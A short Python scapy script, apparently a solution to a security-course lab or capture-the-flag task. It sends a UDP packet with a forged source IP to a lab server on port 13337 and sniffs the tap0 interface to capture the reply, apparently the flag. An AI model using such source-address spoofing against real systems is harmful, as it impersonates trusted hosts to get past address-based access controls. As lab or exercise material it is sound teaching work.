#!/usr/bin/python3

from scapy.all import *
import socket
import os

# dest_host = "flagserv.cse543.rev.fish"
dest_ip = "172.16.44.1"
src_ip = "10.2.4.10"
target_ip = "172.16.20.3"


request = IP(dst=dest_ip, src=src_ip)/UDP(dport=13337)/target_ip
# print(request.show(dump=True))

response = []
t = AsyncSniffer(iface='tap0', filter='udp', count=1,
  prn=lambda p: response.append(p[UDP].payload.load))
t.start()
time.sleep(0.5)
send(request, iface="tap0")
time.sleep(2)
print(response)

